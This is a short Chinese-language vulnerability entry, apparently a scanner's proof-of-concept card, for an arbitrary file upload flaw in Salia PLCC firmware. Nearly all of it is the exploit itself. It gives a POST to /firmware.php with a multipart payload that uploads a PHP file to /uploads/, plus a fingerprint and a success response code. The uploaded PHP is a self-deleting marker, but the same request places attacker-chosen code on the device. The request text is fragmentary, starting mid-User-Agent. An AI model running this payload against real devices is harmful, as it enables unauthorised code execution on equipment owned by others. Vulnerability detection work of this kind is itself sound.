# SaliaPLCCfirmware存在任意文件上传漏洞

SaliaPLCCfirmware ｜ 文件上传 ｜ —
- **指纹**：`Salia PLCC`
- **请求**：`POST /firmware.php HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
------WebKitFormBoundary
Content-Disposition: form-data; name="media"; filename="test123.php"
<?php echo 'DudeSuite'; unlink(__FILE__); ?>
------WebKitFormBoundary--
上传定位：
/uploads/test123.php
```
- **响应特征**：200